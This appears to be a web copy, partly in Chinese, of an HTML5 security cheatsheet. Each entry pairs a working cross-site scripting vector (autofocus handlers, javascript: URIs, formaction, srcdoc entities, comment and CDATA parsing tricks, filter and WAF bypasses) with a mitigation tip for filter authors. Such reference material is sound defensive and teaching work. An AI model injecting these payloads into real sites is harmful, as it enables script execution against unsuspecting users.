<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#60;input onfocus=write(1) autofocus&#62;</span><br></pre></td></tr></table></figure>
<p>检测用户提交的内容中是否含有”autofocus”属性</p>
<ul>
<li>firefox 4.0</li>
<li><p>firefox latest</p>
</li>
<li><p>opera 9.0</p>
</li>
<li><p>opera latest</p>
</li>
<li><p>safari 4.0</p>
</li>
<li><p>safari latest</p>
</li>
<li><p>chrome 4.0</p>
</li>
<li><p>chrome latest</p>
</li>
<li><p>internet explorer 10.0</p>
</li>
<li><p>internet explorer latest</p>
</li>
<li><p>xss</p>
</li>
<li>autofocus</li>
<li>chrome</li>
<li><p>opera</p>
</li>
<li><p><a href="http://www.w3.org/Bugs/Public/show_bug.cgi?id=9602" target="_blank" rel="external">http://www.w3.org/Bugs/Public/show_bug.cgi?id=9602</a></p>
</li>
<li><a href="http://www.whatwg.org/specs/web-apps/current-work/multipage/association-of-controls-and-forms.html#autofocusing-a-form-control" target="_blank" rel="external">http://www.whatwg.org/specs/web-apps/current-work/multipage/association-of-controls-and-forms.html#autofocusing-a-form-control</a></li>
</ul>
<p>reporter：Gareth</p>
<h3 id="通过多个autofocus竞争焦点来触发blur事件#8test">通过多个autofocus竞争焦点来触发blur事件<a href="#8">#8</a><a href="test/#8">test</a></h3><p>这里我们有两个HTML input元素竞争焦点,但焦点到另一个input元素时,前面那个将会触发blur事件</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#60;input onblur=write(1) autofocus&#62;&#60;input autofocus&#62;</span><br></pre></td></tr></table></figure>
<p>检测用户提交的内容中是否含有”autofocus”属性</p>
<ul>
<li>safari 4.0</li>
<li><p>safari latest</p>
</li>
<li><p>chrome 4.0</p>
</li>
<li><p>chrome latest</p>
</li>
<li><p>xss</p>
</li>
<li>autofocus</li>
<li>blur</li>
<li>chrome</li>
<li><p>safari</p>
</li>
<li><p><a href="http://www.w3.org/Bugs/Public/show_bug.cgi?id=9602" target="_blank" rel="external">http://www.w3.org/Bugs/Public/show_bug.cgi?id=9602</a></p>
</li>
<li><a href="http://www.whatwg.org/specs/web-apps/current-work/multipage/association-of-controls-and-forms.html#autofocusing-a-form-control" target="_blank" rel="external">http://www.whatwg.org/specs/web-apps/current-work/multipage/association-of-controls-and-forms.html#autofocusing-a-form-control</a></li>
</ul>
<p>reporter：.mario</p>
<h3 id="通过&lt;VIDEO&gt;的poster属性执行Javascript#10test">通过&lt;VIDEO&gt;的poster属性执行Javascript<a href="#10">#10</a><a href="test/#10">test</a></h3><p>Opera 10.5+的poster属性允许使用javascript: URI.这个bug在opera11中已修复</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#60;video poster=javascript:alert(1)//&#62;&#60;/video&#62;</span><br></pre></td></tr></table></figure>
<p>确保VIDEO的poster属性是相对URI、http URI和MIME-typed正确的data URI</p>
<ul>
<li>opera 10.5</li>
<li><p>opera 11.01</p>
</li>
<li><p>xss</p>
</li>
<li>poster</li>
<li>video</li>
<li>opera</li>
<li>html5</li>
</ul>
<p>reporter：.mario</p>
<h3 id="通过autofocus触发&lt;Body&gt;的onscroll执行Javascript-#12test">通过autofocus触发&lt;Body&gt;的onscroll执行Javascript.<a href="#12">#12</a><a href="test/#12">test</a></h3><p>这个向量是使用autofocus移开焦点的方式来移动滚动条,这样就触发了&lt;BODY&gt;的onscroll事件</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#60;body onscroll=alert(1)&#62;&#60;br&#62;&#60;br&#62;&#60;br&#62;&#60;br&#62;&#60;br&#62;&#60;br&#62;...&#60;br&#62;&#60;br&#62;&#60;br&#62;&#60;br&#62;&#60;input autofocus&#62;</span><br></pre></td></tr></table></figure>
<ul>
<li>firefox 4.0</li>
<li><p>firefox latest</p>
</li>
<li><p>opera 9.0</p>
</li>
<li><p>opera latest</p>
</li>
<li><p>safari 4.0</p>
</li>
<li><p>safari latest</p>
</li>
<li><p>chrome 4.0</p>
</li>
<li><p>chrome latest</p>
</li>
<li><p>xss</p>
</li>
<li>autofocus</li>
<li>scroll</li>
<li>chrome</li>
<li><p>opera</p>
</li>
<li><p><a href="http://www.w3.org/Bugs/Public/show_bug.cgi?id=9602" target="_blank" rel="external">http://www.w3.org/Bugs/Public/show_bug.cgi?id=9602</a></p>
</li>
</ul>
<p>reporter：.mario</p>
<h3 id="Form_surveillance_with_onformchange,_onforminput_and_form_attributes#23test">Form surveillance with onformchange, onforminput and form attributes<a href="#23">#23</a><a href="test/#23">test</a></h3><p>Enter a value into the form element to see how “onforminput” and “onformchange” attributes can monitor &lt;FORM&gt; activity - even from outside the &lt;FORM&gt; via the form attribute on a &lt;BUTTON&gt; element.</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#60;form id=test onforminput=alert(1)&#62;&#60;input&#62;&#60;/form&#62;&#60;button form=test onformchange=alert(2)&#62;X&#60;/button&#62;</span><br></pre></td></tr></table></figure>
<p>Make sure users cannot submit markup including the form, “onformchange” and “onforminput” attributes. Do not apply &lt;FORM&gt; elements with an “id” attribute.</p>
<ul>
<li>opera 10.5</li>
<li><p>opera 12.0</p>
</li>
<li><p>surveillance</p>
</li>
<li>javascript</li>
<li>opera</li>
<li>html5</li>
<li>onforminput</li>
<li><p>onformchange</p>
</li>
<li><p><a href="http://www.whatwg.org/specs/web-apps/current-work/multipage/association-of-controls-and-forms.html#broadcast-formchange-events" target="_blank" rel="external">http://www.whatwg.org/specs/web-apps/current-work/multipage/association-of-controls-and-forms.html#broadcast-formchange-events</a></p>
</li>
</ul>
<p>reporter：Skyphire, .mario</p>
<h3 id="JavaScript_execution_via_&lt;VIDEO&gt;_and_&lt;SOURCE&gt;_tag_(1)#55test">JavaScript execution via &lt;VIDEO&gt; and &lt;SOURCE&gt; tag (1)<a href="#55">#55</a><a href="test/#55">test</a></h3><p>Opera 10.5+ and Chrome allow error handlers in &lt;SOURCE&gt; tags if encapsulated by a &lt;VIDEO&gt; tag. The same works for &lt;AUDIO&gt; tags</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#60;video&#62;&#60;source onerror=&#34;alert(1)&#34;&#62;</span><br></pre></td></tr></table></figure>
<p>Make sure user submitted &lt;SOURCE&gt; tags cannot contain event handlers or whitelist event handlers necessary for UI controls.</p>
<ul>
<li>opera 10.5</li>
<li><p>opera latest</p>
</li>
<li><p>chrome 4.0</p>
</li>
<li><p>chrome latest</p>
</li>
<li><p>firefox 4.0</p>
</li>
<li><p>firefox latest</p>
</li>
<li><p>xss</p>
</li>
<li>javascript</li>
<li>video</li>
<li>source</li>
<li>html5</li>
<li>opera</li>
<li>chrome</li>
<li>audio</li>
</ul>
<p>reporter：.mario</p>
<h3 id="JavaScript_execution_via_&lt;VIDEO&gt;_and_&lt;SOURCE&gt;_tag_(2)#56test">JavaScript execution via &lt;VIDEO&gt; and &lt;SOURCE&gt; tag (2)<a href="#56">#56</a><a href="test/#56">test</a></h3><p>Firefox 3.5+ allows error handlers in &lt;VIDEO&gt; tags when applied with a &lt;SOURCE&gt; tag. The same works for &lt;AUDIO&gt; tags. On Firefox 4+ the &lt;SOURCE&gt; tag is irrelevant to trigger the error event. This happens because of the implicit “src” attribute in &lt;VIDEO&gt; tag when the page has a number sign (#) in the URL.</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#60;video onerror=&#34;alert(1)&#34;&#62;&#60;source&#62;&#60;/source&#62;&#60;/video&#62;</span><br></pre></td></tr></table></figure>
<p>Make sure user submitted &lt;AUDIO&gt; and &lt;VIDEO&gt; tags cannot contain event handlers or whitelist event handlers necessary for UI controls.</p>
<ul>
<li>firefox 3.5</li>
<li><p>firefox latest</p>
</li>
<li><p>internet explorer 9.0</p>
</li>
<li><p>internet explorer latest</p>
</li>
<li><p>xss</p>
</li>
<li>javascript</li>
<li>video</li>
<li>source</li>
<li>html5</li>
<li>firefox</li>
<li>audio</li>
</ul>
<p>reporter：.mario</p>
<h3 id="XSS_via_formaction_-_requiring_user_interaction_(2)#72test">XSS via formaction - requiring user interaction (2)<a href="#72">#72</a><a href="test/#72">test</a></h3><p>A vector displaying the HTML5 “formaction” capabilities for form hijacking. Note that this variation does not use the “id” and “form” attributes to connect button and form.</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#60;form&#62;&#60;button formaction=&#34;javascript:alert(1)&#34;&#62;X&#60;/button&#62;</span><br></pre></td></tr></table></figure>
<p>Don’t allow users to submit markup containing “form” and “formaction” attributes or transform them to bogus attributes.</p>
<ul>
<li>firefox 4.0</li>
<li><p>firefox latest</p>
</li>
<li><p>opera 10.5</p>
</li>
<li><p>opera latest</p>
</li>
<li><p>chrome 10.0</p>
</li>
<li><p>chrome latest</p>
</li>
<li><p>safari 4.0.4</p>
</li>
<li><p>safari latest</p>
</li>
<li><p>internet explorer 10.0</p>
</li>
<li><p>internet explorer latest</p>
</li>
<li><p>xss</p>
</li>
<li>html5</li>
<li>opera</li>
<li>formaction</li>
<li>javascript</li>
<li><p>button</p>
</li>
<li><p><a href="http://www.whatwg.org/specs/web-apps/current-work/multipage/association-of-controls-and-forms.html#attr-fs-formaction" target="_blank" rel="external">http://www.whatwg.org/specs/web-apps/current-work/multipage/association-of-controls-and-forms.html#attr-fs-formaction</a></p>
</li>
</ul>
<p>reporter：.mario</p>
<h3 id="Passive_JavaScript_execution_via_&lt;BODY&gt;_and_oninput_attribute#86test">Passive JavaScript execution via &lt;BODY&gt; and oninput attribute<a href="#86">#86</a><a href="test/#86">test</a></h3><p>All browsers besides Internet Explorer 9↓ support the “oninput” event handler around form elements like the given &lt;INPUT&gt;. The event works for the form elements itself, the surrounding form and &lt;BODY&gt; as well as &lt;HTML&gt; tags.</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#60;body oninput=alert(1)&#62;&#60;input autofocus&#62;</span><br></pre></td></tr></table></figure>
<p>Do not whitelist “oninput” attributes in user submitted markup.</p>
<ul>
<li>firefox 3.6</li>
<li><p>firefox latest</p>
</li>
<li><p>safari 4.0</p>
</li>
<li><p>safari latest</p>
</li>
<li><p>chrome 4.0</p>
</li>
<li><p>chrome latest</p>
</li>
<li><p>opera 9.0</p>
</li>
<li><p>opera latest</p>
</li>
<li><p>internet explorer 10.0</p>
</li>
<li><p>internet explorer latest</p>
</li>
<li><p>xss</p>
</li>
<li>javascript</li>
<li>html5</li>
<li>oninput</li>
<li>form</li>
<li>passive</li>
<li>event</li>
</ul>
<p>reporter：Skyphire</p>
<h3 id="Passive_JavaScript_execution_via_MathML_on_Firefox#130test">Passive JavaScript execution via MathML on Firefox<a href="#130">#130</a><a href="test/#130">test</a></h3><p>Modern Firefox versions allow usage of inline MathML. While other user agents don’t support the href attribute for MathML elements (yet), Firefox does and thereby enables passive JavaScript execution. Note that supporting href for MathML elements is a feature - introduced with MathML 3. The same effect can be observed by using xlink:href. The statusline action further enables obfuscation of the actual link target - and in this example hides the JavaScript URI.</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#60;math href=&#34;javascript:alert(1)&#34;&#62;CLICKME&#60;/math&#62; &#60;math&#62; &#60;!-- up to FF 13 --&#62; &#60;maction actiontype=&#34;statusline#http://google.com&#34; xlink:href=&#34;javascript:alert(2)&#34;&#62;CLICKME&#60;/maction&#62; &#60;!-- FF 14+ --&#62; &#60;maction actiontype=&#34;statusline&#34; xlink:href=&#34;javascript:alert(3)&#34;&#62;CLICKME&#60;mtext&#62;http://http://google.com&#60;/mtext&#62;&#60;/maction&#62; &#60;/math&#62;</span><br></pre></td></tr></table></figure>
<p>Do not allow users to submit unfiltered MathML content.</p>
<ul>
<li>firefox 6</li>
<li><p>firefox latest</p>
</li>
<li><p>mathml</p>
</li>
<li>xss</li>
<li>inline</li>
<li><p>firefox</p>
</li>
<li><p><a href="http://www.w3.org/Math/" target="_blank" rel="external">http://www.w3.org/Math/</a></p>
</li>
<li><a href="https://bugzilla.mozilla.org/show_bug.cgi?id=534968" target="_blank" rel="external">https://bugzilla.mozilla.org/show_bug.cgi?id=534968</a></li>
<li><a href="#87">#87</a></li>
</ul>
<p>reporter：.mario, LeverOne</p>
<h3 id="Transparent_overwriting_of_request-data_using_HTML5_“dirname”_attributes#136test">Transparent overwriting of request-data using HTML5 “dirname” attributes<a href="#136">#136</a><a href="test/#136">test</a></h3><p>Opera and Chrome support the HTML5 attribute “dirname”, that can be used to have the browser communicate the text-flow direction of another input element by adding it to the server-sent request body. By injecting a “dirname” attribute in an existing form, an attacker can overwrite user input and thereby make it guessable for malicious purposes. The overwritten value would then be “ltr” or “rtl” - depending on the actual text-flow direction. The “dirname” attribute is not yet supported by Internet Explorer or Firefox.</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#60;form action=&#34;&#34; method=&#34;post&#34;&#62; &#60;input name=&#34;username&#34; value=&#34;admin&#34; /&#62; &#60;input name=&#34;password&#34; type=&#34;password&#34; value=&#34;secret&#34; /&#62; &#60;input name=&#34;injected&#34; value=&#34;injected&#34; dirname=&#34;password&#34; /&#62; &#60;input type=&#34;submit&#34;&#62; &#60;/form&#62;</span><br></pre></td></tr></table></figure>
<p>Avoid white-listing the “dirname” attribute in user generated content. The effects on existing forms are hard to predict and might cause privacy problems and information leaks.</p>
<ul>
<li><p>opera 12.0</p>
</li>
<li><p>chrome 22.0</p>
</li>
<li><p>chrome latest</p>
</li>
<li><p>html5</p>
</li>
<li>dirname</li>
<li>privacy</li>
<li>http</li>
<li>form</li>
<li><p>infoleak</p>
</li>
<li><p><a href="http://dev.w3.org/html5/spec/common-input-element-attributes.html#the-dirname-attribute" target="_blank" rel="external">http://dev.w3.org/html5/spec/common-input-element-attributes.html#the-dirname-attribute</a></p>
</li>
<li><a href="http://html5sec.org/dirname/" target="_blank" rel="external">http://html5sec.org/dirname/</a></li>
</ul>
<p>reporter：.mario</p>
<h3 id="Executing_JavaScript_via_cross-origin_HTML_imports#138test">Executing JavaScript via cross-origin HTML imports<a href="#138">#138</a><a href="test/#138">test</a></h3><p>Google Chrome Canary already supports HTML Imports. They allow to fetch resources from arbitrary origins (as long as the Access-Control-Origin headers are set properly) and inject it into the requesting DOM. Currently, only Chrome supports the feature and it’s still hidden behind a flag. It is however to be expected to be supported by all major browsers.</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#60;link rel=&#34;import&#34; href=&#34;test.svg&#34; /&#62;</span><br></pre></td></tr></table></figure>
<p>Make sure that HTML imports are limited to the same origin. Avoid permitting users to have &lt;link&gt; tags in user-generated rich-text as they can now directly execute JavaScript without any user interaction.</p>
<ul>
<li>chrome 33.0</li>
<li><p>chrome latest</p>
</li>
<li><p>opera latest</p>
</li>
<li><p>html5</p>
</li>
<li>imports</li>
<li>link</li>
<li>rel</li>
<li>xss</li>
<li><p>active</p>
</li>
<li><p><a href="http://www.w3.org/TR/html-imports/" target="_blank" rel="external">http://www.w3.org/TR/html-imports/</a></p>
</li>
<li><a href="http://html5sec.org/cspbypass/" target="_blank" rel="external">http://html5sec.org/cspbypass/</a></li>
</ul>
<p>reporter：.mario</p>
<h3 id="Executing_JavaScript_via_“srcdoc”_attribute_in_Iframes#139test">Executing JavaScript via “srcdoc” attribute in Iframes<a href="#139">#139</a><a href="test/#139">test</a></h3><p>HTML5 specifies a “srcdoc” attribute for Iframes. This attribute, quite similar to data URIs, is capable of hosting HTML text to be rendered by the browser as the content of the Iframe. The pseudo-document created by the “srcdoc” attribute has full access to the hosting domain, although it runs in an artificial origin. This attribute should if at all only be used in combination with the Iframe Sandbox.</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#60;iframe srcdoc=&#34;&#38;lt;img src&#38;equals;x:x onerror&#38;equals;alert&#38;lpar;1&#38;rpar;&#38;gt;&#34; /&#62;</span><br></pre></td></tr></table></figure>
<p>Make sure to use “srcdoc” only in combination with the Iframe Sandbox. Otherwise, XSS attacks might slip through existing filters’ rules as the payload can be HTML encoded.</p>
<ul>
<li>firefox 26.0</li>
<li><p>firefox latest</p>
</li>
<li><p>chrome 20.0</p>
</li>
<li><p>chrome latest</p>
</li>
<li><p>opera 15.0</p>
</li>
<li><p>opera latest</p>
</li>
<li><p>html5</p>
</li>
<li>iframe</li>
<li>sandbox</li>
<li>srcdoc</li>
<li>xss</li>
<li>active</li>
<li><p>entities</p>
</li>
<li><p><a href="http://www.whatwg.org/specs/web-apps/current-work/multipage/the-iframe-element.html#attr-iframe-srcdoc" target="_blank" rel="external">http://www.whatwg.org/specs/web-apps/current-work/multipage/the-iframe-element.html#attr-iframe-srcdoc</a></p>
</li>
<li><a href="https://developer.mozilla.org/en-US/docs/Web/HTML/Element/iframe" target="_blank" rel="external">https://developer.mozilla.org/en-US/docs/Web/HTML/Element/iframe</a></li>
</ul>
<p>reporter：.mario</p>
<h3 id="HTML5_&lt;picture&gt;_element_and_“srcset”_attributes#142test">HTML5 &lt;picture&gt; element and “srcset” attributes<a href="#142">#142</a><a href="test/#142">test</a></h3><p>HTML5 offers the &lt;picture&gt; element for responsive and accessible images. The &lt;picture&gt; element essentially wraps &lt;source&gt; and &lt;img&gt; elements and provides a way to offer alternative content. Novel here is that the “srcset” attribute allows to trigger load events. This is likely to bypass existing WAF systems.</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#60;picture&#62;&#60;source srcset=&#34;x&#34;&#62;&#60;img onerror=&#34;alert(1)&#34;&#62;&#60;/picture&#62; &#60;picture&#62;&#60;img srcset=&#34;x&#34; onerror=&#34;alert(1)&#34;&#62;&#60;/picture&#62; &#60;img srcset=&#34;,,,,,x&#34; onerror=&#34;alert(1)&#34;&#62;</span><br></pre></td></tr></table></figure>
<p>In case a black-list based XSS filter is in use, make sure that the combination of event handler and “srcset” attribute is detected by it as well.</p>
<ul>
<li>chrome 38.0</li>
<li><p>chrome latest</p>
</li>
<li><p>internet explorer Spartan</p>
</li>
<li><p>picture</p>
</li>
<li>srcset</li>
<li>html5</li>
<li><p>accessibility</p>
</li>
<li><p><a href="http://www.whatwg.org/specs/web-apps/current-work/multipage/embedded-content.html#the-picture-element" target="_blank" rel="external">http://www.whatwg.org/specs/web-apps/current-work/multipage/embedded-content.html#the-picture-element</a></p>
</li>
<li><a href="http://responsiveimages.org/" target="_blank" rel="external">http://responsiveimages.org/</a></li>
</ul>
<p>reporter：.mario</p>
<h3 id="Bypassing_window-opener_protection_of_rel=”noreferrer”#143test">Bypassing window.opener protection of rel=”noreferrer”<a href="#143">#143</a><a href="test/#143">test</a></h3><p>In many situations, a developer might want to mitigate tab-nabbing attacks that are using window.opener and its writable location object. To do so, it is recommended to apply external links with a rel=”noreferrer” attribute. Depending on how the external links are embedded, the protection might however fail - and window.opener might not be null but still be exposed. The problem here is, that rel attributes only work for &lt;a&gt; and &lt;area&gt;. Links and link-like navigation features can however be embedded in multiple other ways. Further note, that MSIE pretty much ignores the standard and doesn’t destroy window.opener without further effort.</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#60;a href=&#34;//evil.com&#34; target=&#34;_blank&#34; rel=&#34;noreferrer&#34;&#62;CLICK&#60;/a&#62; // window.opener will be null &#60;map&#62;&#60;area href=&#34;//evil.com&#34; target=&#34;_blank&#34; rel=&#34;noreferrer&#34;&#62;CLICK&#60;/area&#62;&#60;/map&#62; // window.opener will be null &#60;svg&#62;&#60;a xlink:href=&#34;//evil.com&#34; rel=&#34;noreferrer&#34;&#62;CLICK&#60;/a&#62;&#60;/svg&#62; // window.opener still works &#60;form action=&#34;//evil.com&#34; target=&#34;_blank&#34; rel=&#34;noreferrer&#34;&#62;&#60;input type=&#34;submit&#34;&#62;&#60;/form&#62;// window.opener still works &#60;form id=&#34;test&#34; rel=&#34;noreferrer&#34;&#62;&#60;/form&#62;&#60;button form=&#34;test&#34; formtarget=&#34;_blank&#34; formaction=&#34;//evil.com&#34;&#62;CLICKME&#60;/button&#62;// window.opener still works &#60;math href=&#34;//evil.com&#34; xlink:show=&#34;new&#34; rel=&#34;noreferrer&#34;&#62;CLICKME&#60;/math&#62;// window.opener still works</span><br></pre></td></tr></table></figure>
<p>Do not rely on the noreferrer attribute value alone, but rather use a dedicated de-referrer page that in additon deactivates window.opener using window.opener.<strong>proto</strong>=null.</p>
<ul>
<li>chrome 4.0</li>
<li><p>chrome latest</p>
</li>
<li><p>opera 9.0</p>
</li>
<li><p>opera latest</p>
</li>
<li><p>internet explorer 6.0</p>
</li>
<li><p>internet explorer latest</p>
</li>
<li><p>firefox 1.x</p>
</li>
<li><p>firefox latest</p>
</li>
<li><p>safari 4.0</p>
</li>
<li><p>safari latest</p>
</li>
<li><p>referrer</p>
</li>
<li>opener</li>
<li>html5</li>
<li>location</li>
<li><p>tabnabbing</p>
</li>
<li><p><a href="https://code.google.com/p/chromium/issues/detail?id=45008#c1" target="_blank" rel="external">https://code.google.com/p/chromium/issues/detail?id=45008#c1</a></p>
</li>
<li><a href="https://code.google.com/p/chromium/issues/detail?id=162774" target="_blank" rel="external">https://code.google.com/p/chromium/issues/detail?id=162774</a></li>
<li><a href="https://github.com/molnarg/tabnabbing-demo" target="_blank" rel="external">https://github.com/molnarg/tabnabbing-demo</a></li>
</ul>
<p>reporter：.mario</p>
<h3 id="Generating_greater-than_with_HTML5_Named_Character_References#144test">Generating greater-than with HTML5 Named Character References<a href="#144">#144</a><a href="test/#144">test</a></h3><p>Some of the HTML5 Named Character references generate two ASCII characters, such as &nvlt; and &nvgt;. This can in some exotic scenarios be abused to generate valid HTML without actually closing a tag with an ASCII greater-than. The entity will produce the greater-than so we do not have to.</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#60;iframe srcdoc=&#34;&#60;svg onload=alert(1)&#38;nvgt;&#34;&#62;&#60;/iframe&#62; &#60;a href=&#34;javascript:&#38;apos;&#60;svg onload&#38;equals;alert&#38;lpar;1&#38;rpar;&#38;nvgt;&#38;apos;&#34;&#62;CLICK&#60;/a&#62;</span><br></pre></td></tr></table></figure>
<p>Be very careful when HTML attributes are used to carry HTML data that is later being used on the website. When entities are accepted, some HTML entities can produce dangerous characters even if they don’t look like it on first sight.</p>
<ul>
<li>chrome 4.0</li>
<li><p>chrome latest</p>
</li>
<li><p>opera 12.0</p>
</li>
<li><p>opera latest</p>
</li>
<li><p>internet explorer 9.0</p>
</li>
<li><p>internet explorer latest</p>
</li>
<li><p>firefox 4.x</p>
</li>
<li><p>firefox latest</p>
</li>
<li><p>safari 4.0</p>
</li>
<li><p>safari latest</p>
</li>
<li><p>entity</p>
</li>
<li>character reference</li>
<li>html5</li>
<li><p>iframe</p>
</li>
<li><p><a href="https://developers.whatwg.org/named-character-references.html#named-character-references" target="_blank" rel="external">https://developers.whatwg.org/named-character-references.html#named-character-references</a></p>
</li>
</ul>
<p>reporter：.mario</p>
<h2 id="HTML4和一些老的向量">HTML4和一些老的向量</h2><h3 id="JavaScript_execution_via_&lt;FRAMESET&gt;_and_onload#31test">JavaScript execution via &lt;FRAMESET&gt; and onload<a href="#31">#31</a><a href="test/#31">test</a></h3><p>This classic vector shows that several tags don’t need a “src” attribute to fire onload events, such as &lt;IFRAME&gt;, &lt;BODY&gt; and &lt;FRAMESET&gt;.</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#60;frameset onload=alert(1)&#62;</span><br></pre></td></tr></table></figure>
<p>Be sure to work with whitelists when allowing users to submit markup - else ancient tags like &lt;FRAMESET&gt; might be forgotten to filter and escape.</p>
<ul>
<li>internet explorer 5.0</li>
<li><p>internet explorer latest</p>
</li>
<li><p>opera 8.x</p>
</li>
<li><p>opera latest</p>
</li>
<li><p>firefox 1.x</p>
</li>
<li><p>firefox latest</p>
</li>
<li><p>chrome 3.0</p>
</li>
<li><p>chrome latest</p>
</li>
<li><p>safari 3.0</p>
</li>
<li><p>safari latest</p>
</li>
<li><p>xss</p>
</li>
<li>javascript</li>
<li>frames</li>
<li>classic</li>
<li>html</li>
<li>onload</li>
</ul>
<p>reporter：.mario</p>
<h3 id="JavaScript_execution_via_&lt;TABLE&gt;_and_background#32test">JavaScript execution via &lt;TABLE&gt; and background<a href="#32">#32</a><a href="test/#32">test</a></h3><p>Opera 8-10.5+ as well as Internet Explorer 6 support JavaScript URIs for &lt;TABLE&gt; and some other tags’ “background” attributes. This causes JavaScript execution without user interaction. The problem has been fixed in Opera 11.</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#60;table background=&#34;javascript:alert(1)&#34;&#62;&#60;/table&#62;</span><br></pre></td></tr></table></figure>
<p>In case evil attributes like event handlers are being filtered from user submitted markup make sure not to forget “background” - among others.</p>
<ul>
<li><p>internet explorer 6.0</p>
</li>
<li><p>opera 8.x</p>
</li>
<li><p>opera 11.01</p>
</li>
<li><p>xss</p>
</li>
<li>javascript</li>
<li>background</li>
<li>classic</li>
<li>html</li>
<li>table</li>
</ul>
<p>reporter：.mario</p>
<h3 id="HTML_comment_parsing_issues_(1)#37test">HTML comment parsing issues (1)<a href="#37">#37</a><a href="test/#37">test</a></h3><p>This vector shows how comments are being parsed and what problems can arise in case user submitted HTML is allowed to contain comments.</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#60;!--&#60;img src=&#34;--&#62;&#60;img src=x onerror=alert(1)//&#34;&#62;</span><br></pre></td></tr></table></figure>
<p>Make sure comments are not allowed in user submitted html. The markup should be checked for security issues after comments have been stripped out - not before.</p>
<ul>
<li>internet explorer 5.0</li>
<li><p>internet explorer latest</p>
</li>
<li><p>opera 8.0</p>
</li>
<li><p>opera latest</p>
</li>
<li><p>firefox 1.0</p>
</li>
<li><p>firefox latest</p>
</li>
<li><p>chrome 3.0</p>
</li>
<li><p>chrome latest</p>
</li>
<li><p>safari 3.0</p>
</li>
<li><p>safari latest</p>
</li>
<li><p>xss</p>
</li>
<li>javascript</li>
<li>comment</li>
<li>parsing</li>
<li>attributes</li>
</ul>
<p>reporter：sirdarckcat, .mario</p>
<h3 id="HTML_comment_parsing_issues_(2)#38test">HTML comment parsing issues (2)<a href="#38">#38</a><a href="test/#38">test</a></h3><p>Besides &lt;!—&gt; the Internet Explorer allows to use &lt;COMMENT&gt; tags. The vector shows how comments are being parsed and what problems can arise in case user submitted HTML is allowed to contain comments. This example works up to IE 8 standards mode.</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#60;comment&#62;&#60;img src=&#34;&#60;/comment&#62;&#60;img src=x onerror=alert(1)//&#34;&#62;</span><br></pre></td></tr></table></figure>
<p>Make sure &lt;COMMENT&gt; tags are not allowed in user submitted html. The markup should be checked for security issues after &lt;COMMENT&gt; tags have been stripped out or escaped - not before.</p>
<ul>
<li>internet explorer 5.0</li>
<li><p>internet explorer latest (in older docmode)</p>
</li>
<li><p>xss</p>
</li>
<li>javascript</li>
<li>comment</li>
<li>parsing</li>
<li>attributes</li>
</ul>
<p>reporter：.mario</p>
<h3 id="CDATA_section_parsing_issues#39test">CDATA section parsing issues<a href="#39">#39</a><a href="test/#39">test</a></h3><p>Firefox and Opera allow using CDATA section delimiters in HTML - in the stripped form “&lt;![“ as well as including padding like “&lt;![CDATA[“. This can cause problems for filter mechanisms since those delimiters can be used for massive obfuscation. Firefox 4 and Opera 11.60 have fixed the issue. However, modern browsers have a separate XML parsers for inline SVG or MathML, which allow to use the CDATA sections (including a little irregular shape).</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#60;!-- up to Opera 11.52, FF 3.6.28 --&#62; &#60;![&#62;&#60;img src=&#34;]&#62;&#60;img src=x onerror=alert(1)//&#34;&#62; &#60;!-- IE9+, FF4+, Opera 11.60+, Safari 4.0.4+, GC7+ --&#62; &#60;svg&#62;&#60;![CDATA[&#62;&#60;image xlink:href=&#34;]]&#62;&#60;img src=xx:x onerror=alert(2)//&#34;&#62;&#60;/svg&#62;</span><br></pre></td></tr></table></figure>
<p>Make sure CDATA delimiters are not allowed in user submitted html. The markup should be checked for security issues after CDATA sections nd delimiters have been stripped out or escaped - not before.</p>
<ul>
<li>opera 8.0</li>
<li><p>opera latest</p>
</li>
<li><p>firefox 1.x</p>
</li>
<li><p>firefox latest</p>
</li>
<li><p>internet explorer 9.0</p>
</li>
<li><p>internet explorer latest</p>
</li>
<li><p>chrome 7.0</p>
</li>
<li><p>chrome latest</p>
</li>
<li><p>safari 4.0.4</p>
</li>
<li><p>safari latest</p>
</li>
<li><p>xss</p>
</li>
<li>javascript</li>
<li>cdata</li>
<li>parsing</li>
<li>attributes</li>
<li>math</li>
<li>svg</li>
<li>inline</li>
</ul>
